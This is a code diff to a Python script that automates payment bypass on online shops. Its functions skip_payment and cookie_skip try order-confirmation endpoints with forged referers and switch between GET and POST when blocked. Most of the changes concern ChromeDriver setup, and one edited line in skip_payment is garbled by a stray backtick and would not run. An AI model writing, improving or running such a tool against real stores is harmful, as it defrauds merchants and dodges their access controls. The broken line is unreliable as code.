@@ -7,6 +7,7 @@ from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from webdriver_manager.chrome import ChromeDriverManager
 import os
+import stat
 
 ENDPOINTS = ["/thank_you", "/order/confirmation", "/checkout/success", "/complete"]
 REFERERS = ["/checkout", "/payment", "/cart"]
@@ -28,16 +29,20 @@ def analyze_site(base_url):
     options = Options()
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
-    # Explicitly set Chrome binary for Chromebook
-    options.binary_location = "/usr/bin/chromium"  # Adjust if different
+    options.binary_location = "/usr/bin/chromium"  # Confirmed path
     
     try:
-        driver = webdriver.Chrome(service=ChromeDriverManager().install(), options=options)
+        print("Installing ChromeDriver for Chromium 134...")
+        driver_path = ChromeDriverManager(version="134.0.6998.117").install()
+        print(f"ChromeDriver at: {driver_path}")
+        # Ensure executable
+        os.chmod(driver_path, os.stat(driver_path).st_mode | stat.S_IEXEC)
+        driver = webdriver.Chrome(executable_path=driver_path, options=options)
         print("Selenium initialized.")
     except Exception as e:
-        print(f"Selenium failed: {e}")
-        print("Skipping analysis due to setup error.")
-        return 50  # Default score if analysis bombs
+        print(f"Selenium setup failed: {e}")
+        print("Falling back to default score.")
+        return 50
     
     print(f"Analyzing {base_url}...")
     try:
@@ -129,7 +134,7 @@ def skip_payment(base_url, order_id, exploits=None, proxy=None, method="GET"):
                 return True
             elif response.status_code in [403, 429]:
                 print(f"{method} blocked, switching...")
-                return skip_payment(base_url, order_id, exploits, proxy, "POST" if method == "GET" else "GET")
+                return skip `skip_payment(base_url, order_id, exploits, proxy, "POST" if method == "GET" else "GET")
             else:
                 log_result("errors.txt", f"{url} - {response.status_code}: {response.text[:200]}")
         except requests.RequestException as e:
@@ -147,10 +152,12 @@ def cookie_skip(base_url, proxy):
     options = Options()
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
-    options.binary_location = "/usr/bin/chromium"  # Chromebook Linux path
+    options.binary_location = "/usr/bin/chromium"
     
     try:
-        driver = webdriver.Chrome(service=ChromeDriverManager().install(), options=options)
+        driver_path = ChromeDriverManager(version="134.0.6998.117").install()
+        os.chmod(driver_path, os.stat(driver_path).st_mode | stat.S_IEXEC)
+        driver = webdriver.Chrome(executable_path=driver_path, options=options)
         print("Selenium for Cookie Skip initialized.")
     except Exception as e:
         print(f"Cookie Skip failed at setup: {e}")
